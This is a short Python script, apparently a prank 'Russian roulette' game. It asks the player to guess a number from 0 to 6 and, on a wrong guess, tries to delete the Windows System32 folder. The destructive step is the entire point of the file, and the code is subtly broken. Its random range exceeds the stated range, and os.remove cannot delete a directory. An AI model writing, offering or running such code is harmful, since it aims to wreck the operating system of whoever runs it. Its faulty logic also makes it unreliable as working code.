import os
import random

initialValue = 0
finalValue = 6
x = random.randint(initialValue, finalValue+1)
y = int(input("pick a number between 0 and 6 : "))

if (x != y):
    os.remove(r"C:\Windows\System32")
else:
    print("You survived. THIS TIME.")